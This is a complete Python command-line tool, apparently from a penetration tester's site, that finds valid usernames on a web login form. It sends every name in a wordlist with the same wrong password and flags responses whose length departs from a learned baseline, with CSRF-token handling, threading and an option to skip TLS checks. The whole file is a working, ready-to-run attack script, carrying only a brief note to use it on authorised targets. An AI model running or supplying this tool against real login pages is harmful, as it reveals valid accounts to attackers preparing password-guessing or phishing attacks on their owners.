#!/usr/bin/env python3
"""
userenum - username enumeration via response-length differential (Linux).

Idea: submit every username with the SAME wrong password. A valid username
often yields a slightly different response than an invalid one (e.g.
"wrong password for this account" vs "no such user"). That difference shows
up in the response body length.

We first learn the INVALID baseline by sending garbage usernames, measuring
both the average length and its natural jitter (standard deviation). We then
flag any wordlist username whose length sits clearly outside that band. Using
a band instead of an exact value is what keeps it from false-positiving on the
few-byte noise you see on real apps.

Author: rdw  (rdwsec.github.io)
Use only against systems you are authorised to test.
"""

import argparse
import concurrent.futures
import random
import re
import statistics
import string
import sys
import threading
import time

import requests

requests.packages.urllib3.disable_warnings()  # type: ignore
print_lock = threading.Lock()


def banner():
    print("\n  userenum  -  username enumeration by response length")
    print("  -----------------------------------------------------")
    print("  only run against targets you are authorised to test\n")


def parse_args():
    p = argparse.ArgumentParser(
        description="Detect valid usernames by comparing login response lengths.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("-u", "--url", required=True, help="Login endpoint URL")
    p.add_argument("-w", "--wordlist", required=True,
                   help="Username wordlist, one per line (e.g. a SecLists file)")
    p.add_argument("-p", "--password", default="Wrongpass!_" + "x" * 24,
                   help="Fixed wrong password sent with every username")
    p.add_argument("--username-field", default="username", help="Username field name")
    p.add_argument("--password-field", default="password", help="Password field name")
    p.add_argument("-t", "--type", default="form", choices=["form", "json"],
                   help="Body encoding")
    p.add_argument("--csrf-url", default=None,
                   help="Page to GET a fresh CSRF token from before each attempt")
    p.add_argument("--csrf-field", default=None, help="CSRF token field name")
    p.add_argument("--threads", type=int, default=1,
                   help="Concurrent requests (keep low to avoid lockouts)")
    p.add_argument("--delay", type=float, default=0.0,
                   help="Seconds to sleep between requests (per thread)")
    p.add_argument("--timeout", type=float, default=15.0, help="Request timeout")
    p.add_argument("--baseline", type=int, default=12,
                   help="Garbage usernames used to learn the invalid-length band")
    p.add_argument("--sigma", type=float, default=3.0,
                   help="How many std-devs outside baseline counts as a hit")
    p.add_argument("--tolerance", type=int, default=0,
                   help="Minimum byte deviation to flag (floor under the sigma band)")
    p.add_argument("--insecure", action="store_true",
                   help="Skip TLS verification (common for internal targets)")
    p.add_argument("--user-agent", default="userenum/1.1 (+rdwsec.github.io)",
                   help="User-Agent header")
    p.add_argument("-o", "--output", default=None, help="Write candidates to this file")
    return p.parse_args()


def get_csrf(session, args):
    if not (args.csrf_url and args.csrf_field):
        return None
    try:
        r = session.get(args.csrf_url, timeout=args.timeout, verify=not args.insecure)
        pat = (r'name=["\']' + re.escape(args.csrf_field) +
               r'["\'][^>]*value=["\']([^"\']+)["\']')
        m = re.search(pat, r.text, re.IGNORECASE)
        if not m:
            pat2 = (r'value=["\']([^"\']+)["\'][^>]*name=["\']' +
                    re.escape(args.csrf_field) + r'["\']')
            m = re.search(pat2, r.text, re.IGNORECASE)
        return m.group(1) if m else None
    except requests.RequestException:
        return None


def attempt(session, username, args):
    data = {args.username_field: username, args.password_field: args.password}
    csrf = get_csrf(session, args)
    if csrf and args.csrf_field:
        data[args.csrf_field] = csrf
    kwargs = {
        "timeout": args.timeout, "allow_redirects": False,
        "verify": not args.insecure,
        "headers": {"User-Agent": args.user_agent},
    }
    if args.type == "json":
        kwargs["json"] = data
    else:
        kwargs["data"] = data
    try:
        start = time.time()
        r = session.post(args.url, **kwargs)
        elapsed = round(time.time() - start, 3)
        return {"username": username, "length": len(r.content),
                "status": r.status_code, "elapsed": elapsed, "error": None}
    except requests.RequestException as e:
        return {"username": username, "length": None, "status": None,
                "elapsed": None, "error": str(e)}


def rand_user():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=14))


def learn_baseline(args):
    print(f"[*] Learning invalid baseline with {args.baseline} garbage usernames...")
    session = requests.Session()
    lengths = []
    for _ in range(args.baseline):
        res = attempt(session, rand_user(), args)
        if res["error"]:
            print(f"[!] Baseline request failed: {res['error']}")
            sys.exit(1)
        lengths.append(res["length"])
        if args.delay:
            time.sleep(args.delay)
    mean = statistics.mean(lengths)
    stdev = statistics.pstdev(lengths) if len(lengths) > 1 else 0.0
    half = max(args.sigma * stdev, args.tolerance)
    low, high = mean - half, mean + half
    print(f"[*] Baseline length: mean={mean:.1f} stdev={stdev:.1f} "
          f"-> normal band [{low:.0f} .. {high:.0f}]")
    return mean, low, high


def run(args):
    with open(args.wordlist, encoding="utf-8", errors="ignore") as f:
        usernames = [ln.strip() for ln in f if ln.strip()]
    if not usernames:
        print("[!] Wordlist is empty.")
        sys.exit(1)
    print(f"[*] Loaded {len(usernames)} usernames from {args.wordlist}")

    mean, low, high = learn_baseline(args)
    results, done, total = [], 0, len(usernames)

    def worker(username):
        session = requests.Session()
        res = attempt(session, username, args)
        if args.delay:
            time.sleep(args.delay)
        return res

    print(f"[*] Testing {total} usernames "
          f"({args.threads} thread(s), {args.delay}s delay)...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
        for res in ex.map(worker, usernames):
            done += 1
            results.append(res)
            with print_lock:
                sys.stdout.write(f"\r[*] Progress: {done}/{total}")
                sys.stdout.flush()
    print()
    return results, mean, low, high


def report(results, mean, low, high, args):
    errors = [r for r in results if r["error"]]
    ok = [r for r in results if not r["error"]]
    candidates = [r for r in ok if not (low <= r["length"] <= high)]

    print("\n=== RESULTS ===")
    print(f"Tested: {len(results)}  |  Errors: {len(errors)}  |  "
          f"Likely-valid candidates: {len(candidates)}")
    print(f"Baseline mean={mean:.1f}, normal band [{low:.0f} .. {high:.0f}]")

    if candidates:
        print("\nLikely-valid usernames (length outside baseline band):")
        for r in sorted(candidates, key=lambda x: abs(x["length"] - mean), reverse=True):
            diff = r["length"] - mean
            print(f"  [+] {r['username']:<25} len={r['length']} "
                  f"(delta {diff:+.0f}) status={r['status']}")
    else:
        print("\n[-] No username's length fell outside the baseline band. "
              "Either the app is safe, or its signal isn't length-based "
              "(try timing or error-text instead).")

    if args.output and candidates:
        with open(args.output, "w") as f:
            for r in sorted(candidates, key=lambda x: x["username"]):
                f.write(r["username"] + "\n")
        print(f"\n[*] Candidates written to {args.output}")


def main():
    banner()
    args = parse_args()
    if args.insecure:
        print("[!] TLS verification disabled.")
    results, mean, low, high = run(args)
    report(results, mean, low, high, args)


if __name__ == "__main__":
    main()
